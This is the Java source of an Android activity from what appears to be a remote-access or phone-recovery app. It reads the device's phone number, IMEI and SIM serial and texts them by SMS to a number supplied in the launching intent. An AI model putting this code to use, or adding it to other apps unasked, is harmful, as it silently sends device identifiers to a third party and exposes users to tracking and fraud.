package com.example.asf.remoteaccess;

import android.content.Context;
import android.content.Intent;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.telecom.TelecomManager;
import android.telephony.TelephonyManager;
import android.telephony.gsm.SmsManager;
import android.widget.Toast;

public class Get_Imei_no extends AppCompatActivity {

    String no,imei,serial,phoneNo;
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_get__imei_no);
        Intent intent = getIntent();
        phoneNo = intent.getStringExtra("number");

        getnumber(phoneNo);
    }
    public  void getnumber (String num)
    {
        TelephonyManager tm=(TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
        no=tm.getLine1Number();
        imei=tm.getDeviceId();
        serial=tm.getSimSerialNumber();
        String value="Phone No:"+no+"\n"+"IMEI no:"+imei+"\n"+"Serial no:"+serial;
        SendSMS(num,value);
        Toast.makeText(Get_Imei_no.this, "Hello\n", Toast.LENGTH_SHORT).show();
    }
    public  void SendSMS(String phoneNumber,String msg)
    {
        SmsManager smsManager = SmsManager.getDefault();
        smsManager.sendTextMessage(phoneNumber, null, msg, null, null);
        Toast.makeText(Get_Imei_no.this, phoneNumber, Toast.LENGTH_SHORT).show();
        Get_Imei_no.this.finish();
    }
}
